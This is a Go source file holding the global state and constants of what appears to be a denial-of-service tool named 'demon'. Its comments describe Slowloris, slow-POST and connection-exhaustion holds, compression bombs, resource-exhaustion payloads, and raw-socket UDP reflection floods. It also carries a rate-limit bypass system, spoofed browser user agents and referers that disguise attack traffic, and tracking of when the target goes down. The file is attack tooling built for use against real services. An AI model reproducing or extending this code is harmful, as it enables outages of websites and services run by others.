package main

import (
	"sync"
	"sync/atomic"
)

const __version__ = "3.0-Advanced"

// dashboardActive is true while the live dashboard owns the terminal. when set, the
// logger writes to the log file ONLY and stays off stdout, otherwise a Debug/Info
// line from any of the hundreds of worker/health/adaptive goroutines lands in the
// middle of a dashboard frame, scrolling it and desyncing the in place redraw. that
// interleaving was the main cause of the "garbled / shifting / disappearing"
// dashboard. errors are not lost: they're still written to demon.log every time.
var dashboardActive atomic.Bool

// maxConcurrentUDPFloods is the DEFAULT cap on simultaneous type-10 invocations so
// the raw-socket reflection path can't exhaust the OS thread table (see udpFloodSlots
// below). overridable via -max-udp-floods / config for high-bandwidth boxes that
// aren't uplink-bound at 8, but raising it too far re-opens the thread-exhaustion
// crash this guards against.
const maxConcurrentUDPFloods = 8

// resourceBurnThresholdMs marks the latency floor that counts as a real type-9
// burn signal in the dashboard. responses slower than this are treated as the
// payload actually doing work rather than being parsed cheaply or rejected.
const resourceBurnThresholdMs = 500

// Attack patterns and strategies
var (
	config               AttackConfig
	hybridAttackTypes    []uint8 // set at startup; len > 1 means workers randomly pick from this pool each job
	totalBytesSent       uint64
	totalConnections     uint64
	successfulHits       uint64
	udpLocalSendAttempts uint64
	udpLocalSendFailures uint64
	failedRequests       atomic.Uint64
	slowlorisActive      uint64 // Number of active Slowloris connections (type 1)

	// hold attack gauges. types 1/6/8 hold a connection open instead of completing
	// requests, so they never show up in the per-request latency table, these
	// counters are how the dashboard makes them visible. each is the number of
	// connections that type is currently holding. slowlorisActive (above) is type 1.
	protocolExploitActive uint64 // type 6, slow-POST connections currently held
	connExhaustActive     uint64 // type 8, silent connections currently held

	// heldConnActive is the combined live count across all three hold types, used to
	// enforce maxHeldConnections. these attacks are dispatched fire and forget, so
	// without a cap a long run spawns unbounded held-connection goroutines and can
	// exhaust the OPERATOR's own fds/memory before it troubles the target.
	heldConnActive  int64
	heldConnSkipped uint64 // hold dispatches skipped because the cap was reached

	// maxHeldConnections backstops runaway held-connection growth. it protects the
	// operator's own machine, not the target, on most boxes you hit the OS fd limit
	// first. overridable via -max-held-connections.
	maxHeldConnections int64 = 50000

	// udpFloodSlots bounds how many UDP floods (type 10) run concurrently. the raw-
	// socket reflection path spawns ~150 goroutines per invocation, each doing a
	// BLOCKING raw syscall.Sendto, and unlike network I/O (which Go's netpoller
	// services without a thread) every concurrent raw syscall pins an OS thread. at
	// high -concurrency that multiplies into tens of thousands of threads and crashes
	// the runtime ("failed to create new OS thread"). 8 × ~150 ≈ 1200 concurrent raw
	// senders, comfortably under Go's ~10k OS thread ceiling. this protects the
	// operator's own process; a single machine's UDP output is uplink-bound long
	// before 8 invocations, so it costs no real throughput.
	udpFloodSlots = make(chan struct{}, maxConcurrentUDPFloods)

	// compression bomb (type 7) landing signal. the README notes that this
	// type's real-world impact is uncertain, these counters turn "uncertain" into
	// an observable number. a 413/431/400 means the body was rejected on size/format
	// before any decompression; anything else means it was at least accepted into
	// the request pipeline (and on a vulnerable stack, decompressed into the 64MB
	// buffer). high rejected count = the bomb is being dropped at the edge.
	compressionAccepted uint64
	compressionRejected uint64

	// type 9 (resource exhaustion) "burn" signal. these payloads (XML entity
	// expansion, deeply nested JSON, ReDoS bait, GraphQL depth bombs) are meant to
	// cost the server CPU/memory, but whether they land depends entirely on the
	// target's parsers, the README notes it's "speculative." a response
	// slow enough to clear resourceBurnThresholdMs is the observable proxy for the
	// payload actually doing work, the same move we made for the compression bomb.
	resourceBurnHits  uint64 // responses slower than resourceBurnThresholdMs
	resourceCompleted uint64 // responses that completed (denominator for burn rate)

	// Health monitoring
	targetResponding    uint64 // 1 if target is responding, 0 if genuinely down
	lastResponseTime    uint64 // Last response time in milliseconds
	healthCheckCount    uint64 // Total health checks performed (all outcomes)
	consecutiveFailures uint64 // Consecutive *genuine* target failures (drives the down trigger)
	targetDownTime      uint64 // Time when target went down (Unix timestamp)

	// Health checks are split three ways so we never blame the target for our own
	// saturated uplink (the false "DOWN" you get during a UDP/high-rate flood):
	//   targetOKChecks, target answered
	//   congestionChecks, target failed AND known-good control hosts ALSO failed, so
	//                      the failure is our own link, not the target (status unknown)
	//   genuine target failures = healthCheckCount - targetOKChecks - congestionChecks
	targetOKChecks   uint64
	congestionChecks uint64
	localCongestion  uint64 // 1 if the most recent check was inconclusive due to local congestion

	// Latest request tracking for dashboard display (no console spam)
	lastRequestURL     string
	lastRequestSize    uint64
	lastResponseSize   uint64
	lastResponseCode   uint64
	lastRequestProto   string
	requestTrackingMux sync.RWMutex

	// Rate Limit Bypass System - Global Infrastructure
	rateLimitDetector  *RateLimitDetector
	delayManager       *IntelligentDelayManager
	globalDemonConfig  *DemonConfig
	globalLogger       *Logger
	globalProxyManager *EnhancedProxyManager

	// Rate limiting diagnostics
	workersWaitingOnRate uint64 // Number of workers currently blocked by rate limiter

	// Realistic browser fingerprints
	realisticUserAgents = []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0",
	}

	// Realistic referers for mimicking organic traffic
	organicReferers = []string{
		"https://www.google.com/search?q=%s",
		"https://www.bing.com/search?q=%s",
		"https://duckduckgo.com/?q=%s",
		"https://search.yahoo.com/search?p=%s",
		"https://www.facebook.com/",
		"https://twitter.com/",
		"https://www.reddit.com/",
		"https://news.ycombinator.com/",
		"https://www.linkedin.com/",
		"", // Direct traffic
	}

	// Cache busting parameters
	cacheBustParams = []string{
		"_cb", "cache", "v", "version", "t", "timestamp", "r", "random",
		"nocache", "bust", "refresh", "_", "time", "rnd",
	}

	// API endpoints to fuzz
	commonAPIEndpoints = []string{
		"/api/v1/users", "/api/v2/users", "/api/users",
		"/api/v1/auth", "/api/v2/auth", "/api/auth",
		"/api/v1/login", "/api/v2/login", "/api/login",
		"/api/v1/data", "/api/v2/data", "/api/data",
		"/api/v1/search", "/api/v2/search", "/api/search",
		"/api/v1/upload", "/api/v2/upload", "/api/upload",
		"/graphql", "/api/graphql",
		"/rest/v1/", "/rest/v2/",
		"/webhook", "/webhooks",
		"/admin", "/admin/api",
	}

	// Protocol-level exploits
	httpMethods = []string{
		"GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS",
		"TRACE", "CONNECT", "PROPFIND", "PROPPATCH", "MKCOL", "COPY", "MOVE",
		"LOCK", "UNLOCK", "VERSION-CONTROL", "CHECKOUT", "UNCHECKOUT", "CHECKIN",
	}
)
